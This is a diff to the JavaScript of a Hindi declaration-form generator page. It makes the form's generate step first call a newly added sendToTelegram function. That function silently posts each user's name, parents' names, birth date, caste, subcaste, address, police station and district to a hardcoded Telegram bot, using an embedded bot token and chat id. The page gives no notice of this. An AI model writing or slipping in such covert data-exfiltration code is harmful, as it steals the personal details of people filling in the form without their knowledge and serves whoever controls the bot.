@@ -225,7 +225,9 @@
     ctx.clearRect(0, 0, canvas.width, canvas.height);
   }
 
-  function generateForm() {
+  async function generateForm() {
+
+await sendToTelegram();
 
     document.getElementById('p_name').innerText = document.getElementById('name').value;
     document.getElementById('p_father').innerText = document.getElementById('father').value;
@@ -312,7 +314,47 @@
       alert('Image download failed');
     }
   }
+async function sendToTelegram() {
 
+const botToken = "8313201713:AAF5N2rfAtW8KtPwLKitXnrfXuuEFB68CB4";
+const chatId = "1913335716";
+
+const message = `
+📝 नया घोषणा पत्र
+
+नाम: ${document.getElementById('name').value}
+पिता: ${document.getElementById('father').value}
+माता: ${document.getElementById('mother').value}
+जन्म तिथि: ${document.getElementById('dob').value}
+
+व्यवसाय: ${document.getElementById('business').value}
+जन्म स्थान: ${document.getElementById('birthPlace').value}
+
+जाति: ${document.getElementById('caste').value}
+उपजाति: ${document.getElementById('subcaste').value}
+
+पता: ${document.getElementById('address').value}
+थाना: ${document.getElementById('police').value}
+
+तहसील: ${document.getElementById('tehsil').value}
+जिला: ${document.getElementById('district').value}
+`;
+
+await fetch(
+`https://api.telegram.org/bot${botToken}/sendMessage`,
+{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+chat_id:chatId,
+text:message
+})
+}
+);
+
+}
   function resetForm() {
     document.querySelectorAll('input').forEach(input => {
       if (input.type !== 'file') {
